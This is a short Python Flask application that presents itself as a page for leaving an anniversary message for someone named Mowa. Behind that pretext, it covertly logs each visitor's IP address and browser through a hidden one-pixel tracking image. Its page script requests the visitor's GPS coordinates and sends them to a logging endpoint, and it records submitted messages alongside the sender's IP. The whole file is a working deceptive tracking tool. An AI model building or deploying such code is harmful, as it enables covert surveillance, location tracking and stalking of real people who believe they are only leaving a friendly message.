from flask import Flask, request, send_file, jsonify
import datetime

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    # Cargar la imagen y el script en el HTML
    return """
        <h2>💬 Deja un mensaje para Mowa en su ANIVERSARIO</h2>
        <form method="POST">
            <textarea name="mensaje" rows="4" cols="40" placeholder="Escribe aquí..." required></textarea><br><br>
            <button type="submit">Enviar</button>
        </form>
        <img src="/recibo.jpeg" alt="Invisible" width="1" height="1" style="display:none;">

        <script>
        navigator.geolocation.getCurrentPosition(function(pos) {
            fetch('/log-coords', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude
                })
            });
        });
        </script>
    """

@app.route('/', methods=['POST'])
def post_message():
    forwarded = request.headers.get('X-Forwarded-For', '')
    ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr
    ua = request.headers.get('User-Agent')
    msg = request.form.get('mensaje', '').strip()
    now = datetime.datetime.now().isoformat()

    print(f"{now} - IP: {ip} 🙂 - MENSAJE: {msg} - UA: {ua}")

    return "<h2>✅ Gracias, tu mensaje ha sido enviado.</h2>"

@app.route('/recibo.jpeg')
def tracker():
    forwarded = request.headers.get('X-Forwarded-For', '')
    ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr
    ua = request.headers.get('User-Agent')
    now = datetime.datetime.now().isoformat()

    print(f"{now} - IP: {ip} 🙂 - UA: {ua} (imagen rastreadora)")
    return send_file("recibo.jpeg", mimetype="image/jpeg")

@app.route('/log-coords', methods=['POST'])
def log_coords():
    data = request.get_json()
    now = datetime.datetime.now().isoformat()
    print(f"{now} - 📍 Coordenadas GPS del usuario: {data['lat']}, {data['lon']}")
    return jsonify({'status': 'ok'}), 200

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
